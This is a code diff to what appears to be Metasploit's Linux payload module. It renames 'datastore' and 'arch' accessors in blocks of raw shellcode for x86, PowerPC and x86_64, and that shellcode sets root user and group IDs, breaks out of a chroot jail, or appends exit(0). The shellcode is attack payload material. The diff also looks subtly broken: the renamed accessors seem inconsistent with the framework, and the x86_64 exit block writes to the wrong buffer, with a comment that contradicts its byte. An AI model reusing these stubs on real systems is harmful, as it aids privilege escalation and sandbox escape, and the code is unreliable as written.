@@ -90,14 +90,14 @@ module Msf::Payload::Linux
     pre = ''
     app = ''
 
-    test_arch = [ *(self.arch) ]
+    test_arch = [ *(self.architecture_abbreviations) ]
 
     # Handle all x86 code here
     if (test_arch.include?(ARCH_X86))
 
       # Prepend
 
-      if (datastore['PrependSetresuid'])
+      if (data_store['PrependSetresuid'])
         # setresuid(0, 0, 0)
         pre << "\x31\xc9"             +#   xorl    %ecx,%ecx                  #
                "\x31\xdb"             +#   xorl    %ebx,%ebx                  #
@@ -106,7 +106,7 @@ module Msf::Payload::Linux
                "\xcd\x80"              #   int     $0x80                      #
       end
 
-      if (datastore['PrependSetreuid'])
+      if (data_store['PrependSetreuid'])
         # setreuid(0, 0)
         pre << "\x31\xc9"             +#   xorl    %ecx,%ecx                  #
                "\x31\xdb"             +#   xorl    %ebx,%ebx                  #
@@ -115,7 +115,7 @@ module Msf::Payload::Linux
                "\xcd\x80"              #   int     $0x80                      #
       end
 
-      if (datastore['PrependSetuid'])
+      if (data_store['PrependSetuid'])
         # setuid(0)
         pre << "\x31\xdb"             +#   xorl    %ebx,%ebx                  #
                "\x6a\x17"             +#   pushl   $0x17                      #
@@ -123,7 +123,7 @@ module Msf::Payload::Linux
                "\xcd\x80"              #   int     $0x80                      #
       end
 
-      if (datastore['PrependSetresgid'])
+      if (data_store['PrependSetresgid'])
         # setresgid(0, 0, 0)
         pre << "\x31\xc9"             +#   xorl    %ecx,%ecx                  #
                "\x31\xdb"             +#   xorl    %ebx,%ebx                  #
@@ -132,7 +132,7 @@ module Msf::Payload::Linux
                "\xcd\x80"              #   int     $0x80                      #
       end
 
-      if (datastore['PrependSetregid'])
+      if (data_store['PrependSetregid'])
         # setregid(0, 0)
         pre << "\x31\xc9"             +#   xorl    %ecx,%ecx                  #
                "\x31\xdb"             +#   xorl    %ebx,%ebx                  #
@@ -141,14 +141,14 @@ module Msf::Payload::Linux
                "\xcd\x80"              #   int     $0x80                      #
       end
 
-      if (datastore['PrependSetgid'])
+      if (data_store['PrependSetgid'])
         # setgid(0)
         pre << "\x31\xdb"             +#   xorl    %ebx,%ebx                  #
                "\x6a\x2e"             +#   pushl   $0x2e                      #
                "\x58"                 +#   popl    %eax                       #
                "\xcd\x80"              #   int     $0x80                      #
       end
-      if (datastore['PrependChrootBreak'])
+      if (data_store['PrependChrootBreak'])
         # setreuid(0, 0)
         pre << "\x31\xc9"             +#   xorl    %ecx,%ecx                  #
                "\x31\xdb"             +#   xorl    %ebx,%ebx                  #
@@ -190,7 +190,7 @@ module Msf::Payload::Linux
 
       # Append exit(0)
 
-      if (datastore['AppendExit'])
+      if (data_store['AppendExit'])
         app << "\x31\xdb"             +#   xorl    %ebx,%ebx                  #
           "\x6a\x01"             +#   pushl   $0x01                      #
           "\x58"                 +#   popl    %eax                       #
@@ -204,7 +204,7 @@ module Msf::Payload::Linux
 
       # Prepend
 
-      if (datastore['PrependSetresuid'])
+      if (data_store['PrependSetresuid'])
         # setresuid(0, 0, 0)
         pre << "\x3b\xe0\x01\xff"     +#   li      r31,511                    #
                "\x7c\xa5\x2a\x78"     +#   xor     r5,r5,r5                   #
@@ -214,7 +214,7 @@ module Msf::Payload::Linux
                "\x44\xff\xff\x02"      #   sc                                 #
       end
 
-      if (datastore['PrependSetreuid'])
+      if (data_store['PrependSetreuid'])
         # setreuid(0, 0)
         pre << "\x3b\xe0\x01\xff"     +#   li      r31,511                    #
                "\x7c\x84\x22\x78"     +#   xor     r4,r4,r4                   #
@@ -223,7 +223,7 @@ module Msf::Payload::Linux
                "\x44\xff\xff\x02"      #   sc                                 #
       end
 
-      if (datastore['PrependSetuid'])
+      if (data_store['PrependSetuid'])
         # setuid(0)
         pre << "\x3b\xe0\x01\xff"     +#   li      r31,511                    #
                "\x7c\x63\x1a\x78"     +#   xor     r3,r3,r3                   #
@@ -231,7 +231,7 @@ module Msf::Payload::Linux
                "\x44\xff\xff\x02"      #   sc                                 #
       end
 
-      if (datastore['PrependSetresgid'])
+      if (data_store['PrependSetresgid'])
         # setresgid(0, 0, 0)
         pre << "\x3b\xe0\x01\xff"     +#   li      r31,511                    #
                "\x7c\xa5\x2a\x78"     +#   xor     r5,r5,r5                   #
@@ -241,7 +241,7 @@ module Msf::Payload::Linux
                "\x44\xff\xff\x02"      #   sc                                 #
       end
 
-      if (datastore['PrependSetregid'])
+      if (data_store['PrependSetregid'])
         # setregid(0, 0)
         pre << "\x3b\xe0\x01\xff"     +#   li      r31,511                    #
                "\x7c\x84\x22\x78"     +#   xor     r4,r4,r4                   #
@@ -250,7 +250,7 @@ module Msf::Payload::Linux
                "\x44\xff\xff\x02"      #   sc                                 #
       end
 
-      if (datastore['PrependSetgid'])
+      if (data_store['PrependSetgid'])
         # setgid(0)
         pre << "\x3b\xe0\x01\xff"     +#   li      r31,511                    #
                "\x7c\x63\x1a\x78"     +#   xor     r3,r3,r3                   #
@@ -258,7 +258,7 @@ module Msf::Payload::Linux
                "\x44\xff\xff\x02"      #   sc                                 #
       end
 
-      if (datastore['PrependChrootBreak'])
+      if (data_store['PrependChrootBreak'])
         # setreuid(0, 0)
         pre << "\x3b\xe0\x01\xff"     +#   li      r31,511                    #
                "\x7c\x84\x22\x78"     +#   xor     r4,r4,r4                   #
@@ -271,7 +271,7 @@ module Msf::Payload::Linux
 
       # Append exit(0)
 
-      if (datastore['AppendExit'])
+      if (data_store['AppendExit'])
         app << "\x3b\xe0\x01\xff"     +#   li      r31,511                    #
                "\x7c\x63\x1a\x78"     +#   xor     r3,r3,r3                   #
                "\x38\x1f\xfe\x02"     +#   addi    r0,r31,-510                #
@@ -281,7 +281,7 @@ module Msf::Payload::Linux
 
     if (test_arch.include?(ARCH_X86_64))
 
-      if (datastore['PrependSetresuid'])
+      if (data_store['PrependSetresuid'])
         # setresuid(0, 0, 0)
         pre << "\x48\x31\xff"         #    xor     rdi,rdi                   #
         pre << "\x48\x89\xfe"         #    mov     rsi,rdi                   #
@@ -290,7 +290,7 @@ module Msf::Payload::Linux
         pre << "\x0f\x05"             #    syscall                           #
       end
 
-      if (datastore['PrependSetreuid'])
+      if (data_store['PrependSetreuid'])
         # setreuid(0, 0)
         pre << "\x48\x31\xff"         #    xor     rdi,rdi                   #
         pre << "\x48\x89\xfe"         #    mov     rsi,rdi                   #
@@ -300,7 +300,7 @@ module Msf::Payload::Linux
         pre << "\x0f\x05"             #    syscall                           #
       end
 
-      if (datastore['PrependSetuid'])
+      if (data_store['PrependSetuid'])
         # setuid(0)
         pre << "\x48\x31\xff"         #    xor     rdi,rdi                   #
         pre << "\x6a\x69"             #    push    0x69                      #
@@ -308,7 +308,7 @@ module Msf::Payload::Linux
         pre << "\x0f\x05"             #    syscall                           #
       end
 
-      if (datastore['PrependSetresgid'])
+      if (data_store['PrependSetresgid'])
         # setresgid(0, 0, 0)
         pre << "\x48\x31\xff"         #    xor     rdi,rdi                   #
         pre << "\x48\x89\xfe"         #    mov     rsi,rdi                   #
@@ -317,7 +317,7 @@ module Msf::Payload::Linux
         pre << "\x0f\x05"             #    syscall                           #
       end
 
-      if (datastore['PrependSetregid'])
+      if (data_store['PrependSetregid'])
         # setregid(0, 0)
         pre << "\x48\x31\xff"         #    xor     rdi,rdi                   #
         pre << "\x48\x89\xfe"         #    mov     rsi,rdi                   #
@@ -327,7 +327,7 @@ module Msf::Payload::Linux
         pre << "\x0f\x05"             #    syscall                           #
       end
 
-      if (datastore['PrependSetgid'])
+      if (data_store['PrependSetgid'])
         # setgid(0)
         pre << "\x48\x31\xff"         #    xor     rdi,rdi                   #
         pre << "\x6a\x6a"             #    push    0x6a                      #
@@ -335,7 +335,7 @@ module Msf::Payload::Linux
         pre << "\x0f\x05"             #    syscall                           #
       end
 
-      if (datastore['PrependChrootBreak'])
+      if (data_store['PrependChrootBreak'])
 
         # setreuid(0, 0)
         pre << "\x48\x31\xff"         #    xor     rdi,rdi                   #
@@ -387,7 +387,7 @@ module Msf::Payload::Linux
       end
 
       # Append exit(0)
-      if (datastore['AppendExit'])
+      if (data_store['AppendExit'])
         app << "\x48\x31\xff"         #    xor     rdi,rdi                   #
         pre << "\x6a\x3c"             #    push    0x53                      #
         pre << "\x58"                 #    pop     rax                       #
